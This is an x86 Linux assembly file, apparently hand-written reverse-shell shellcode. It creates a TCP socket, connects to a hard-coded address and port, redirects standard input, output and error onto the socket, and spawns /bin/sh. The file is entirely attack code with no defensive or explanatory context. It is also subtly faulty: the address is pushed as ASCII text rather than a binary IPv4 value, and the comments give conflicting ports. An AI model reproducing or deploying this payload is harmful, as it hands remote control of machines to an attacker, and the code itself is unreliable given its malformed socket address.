section .text 

global main

main:

    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    xor esi,esi
    xor edi,edi


    mov al,102  ;   socketcall
    mov bl,1

    push esi    ; 
    push 1      ; SOCK_STREAM   - socket_type.h
    push 2      ;  AF_INET socket.h
    mov ecx,esp 

    int 0x80    ; socket()
    mov edx,eax 

    ;connect(clientfd,(struct sockaddr*)&client,sizeof(client));
    mov al,102
    mov bl,3

    ;client.sin_family = AF_INET;
    ;client.sin_port = htons(1234); 04d2
    ;client.sin_addr.s_addr = inet_addr("127.0.0.1");
    ;   31 32 37 2e 30 30 30 2e 30 30 2e 31 
    
    push esi
 ;   push byte 0x31
	push 0x2e302e30     ; 127.0.0.1  , 0.0.0.0
	push 0x2e373231
    push word 0x3905  ;1337=0x3905   1234=04d2
    push word 2
    mov ecx,esp 
    push 16 
    push ecx
    push edx 

    mov ecx,esp

    int 0x80

    ; dup2(sockfd,0)  1 and 2 
    xor eax,eax
    xor ecx,ecx

    mov al,63
    mov ebx,edx 
    int 0x80


    
    mov al,63
    
    mov cl,1
    int 0x80

    
    mov al,63
    mov cl,2
    int 0x80


    ;execve("//bin/sh",NULL,NULL)   11
    xor eax,eax
    xor esi,esi
    
    mov al,11
    push esi 
    ;2f 2f 62 69 6e 2f 73 68 

    push 0x68732f2f		; "//sh"
	push 0x6e69622f     ; "/bin"
    mov ebx,esp 
    mov ecx,esi 
    mov edx,esi 

    int 0x80







